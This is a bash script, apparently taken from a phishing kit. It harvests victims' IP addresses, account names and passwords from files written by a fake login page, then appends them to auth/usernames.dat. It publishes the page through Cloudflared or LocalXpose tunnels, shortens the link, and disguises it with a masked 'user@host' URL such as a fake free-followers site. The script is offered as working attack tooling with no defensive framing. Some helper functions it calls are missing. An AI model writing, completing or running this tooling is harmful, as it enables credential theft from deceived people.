#!/bin/bash

# --- Color Variables for Styling ---
RED="\033[0;31m"
WHITE="\033[1;37m"
GREEN="\033[0;32m"
BLUE="\033[0;34m"
CYAN="\033[0;36m"
ORANGE="\033[0;33m"

# --- Info Capture Functions ---
capture_ip() {
  IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
  IFS=$'\n'
  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
  echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
  cat .server/www/ip.txt >> auth/ip.txt
}

capture_creds() {
  ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
  PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
  IFS=$'\n'
  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
  echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
  cat .server/www/usernames.txt >> auth/usernames.dat
  echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

# --- Tunnel Menu Functions ---
tunnel_menu() {
  { clear; banner_small; }
  cat <<- EOF
    ${RED}[${WHITE}01${RED}]${ORANGE} Localhost
    ${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
    ${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
  EOF

  read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

  case $REPLY in
    1 | 01)
      start_localhost;;
    2 | 02)
      start_cloudflared;;
    3 | 03)
      start_loclx;;
    *)
      echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
      { sleep 1; tunnel_menu; };;
  esac
}

start_localhost() {
  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Localhost server..."
  php -S 127.0.0.1:8080
}

start_cloudflared() {
  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Using cloudflared to expose local server..."
  PUBLIC_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
  echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Public URL: ${GREEN}$PUBLIC_URL"
}

start_loclx() {
  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Using LocalXpose to expose local server..."
  PUBLIC_URL=$(loclx -t 15 -u http://127.0.0.1:8080)
  echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Public URL: ${GREEN}$PUBLIC_URL"
}

# --- Custom Mask URL Function ---
custom_mask() {
  { sleep .5; clear; banner_small; echo; }
  read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
  echo
  if [[ ${mask_op,,} == "y" ]]; then
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
    read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
    if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
      mask=$mask_url
      echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
    else
      echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
    fi
  fi
}

# --- URL Shortener ---
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
  short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
  if [[ "$1" == *"shrtco.de"* ]]; then
    processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
  else
    processed_url=${short#http*//}
  fi
}

custom_url() {
  url=${1#http*//}
  isgd="https://is.gd/create.php?format=simple&url="
  shortcode="https://api.shrtco.de/v2/shorten?url="
  tinyurl="https://tinyurl.com/api-create.php?url="

  { custom_mask; sleep 1; clear; banner_small; }
  if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
    if [[ $(site_stat $isgd) == 2* ]]; then
      shorten $isgd "$url"
    elif [[ $(site_stat $shortcode) == 2* ]]; then
      shorten $shortcode "$url"
    else
      shorten $tinyurl "$url"
    fi

    url="https://$url"
    masked_url="$mask@$processed_url"
    processed_url="https://$processed_url"
  else
    url="Unable to generate links. Try after turning on hotspot"
    processed_url="Unable to Short URL"
  fi

  echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
  echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
  [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

# Run the tunnel menu
tunnel_menu
